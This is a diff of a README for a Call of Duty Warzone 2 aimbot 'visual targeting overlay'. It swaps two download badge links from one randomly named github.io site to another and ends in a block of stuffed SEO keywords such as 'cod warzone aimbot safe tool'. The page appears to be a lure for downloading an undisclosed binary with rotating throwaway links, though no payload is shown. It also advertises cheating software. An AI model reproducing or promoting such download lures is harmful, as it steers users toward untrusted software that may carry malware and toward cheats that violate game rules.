@@ -1,7 +1,7 @@
 # 🎯 COD Warzone 2 Aimbot — Visual Targeting Overlay Assistant
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download_Setup_Assistant-red?style=for-the-badge)](https://milanoforesta6vebdble.github.io/.github/)  
-[![Download Now](https://img.shields.io/badge/Download_Now-darkblue?style=for-the-badge&logo=call-of-duty)](https://milanoforesta6vebdble.github.io/.github/)
+[![Download Setup Assistant](https://img.shields.io/badge/Download_Setup_Assistant-red?style=for-the-badge)](https://warzonecod1soft1web0.github.io/.github/)  
+[![Download Now](https://img.shields.io/badge/Download_Now-darkblue?style=for-the-badge&logo=call-of-duty)](https://warzonecod1soft1web0.github.io/.github/)
 
 ---
 
@@ -79,4 +79,3 @@ Refine your accuracy in **Call of Duty: Warzone 2** with this external **Aimbot 
 ## 🔍 SEO Keywords
 
 cod warzone 2 aimbot, warzone2 aim overlay, aimbot for call of duty warzone 2, fov lock warzone2 tool, warzone 2 external aim assistant, bone targeting warzone 2, smooth aim overlay cod, visual aimbot warzone2, cod wz2 aim enhancer, cod warzone aimbot safe tool
-
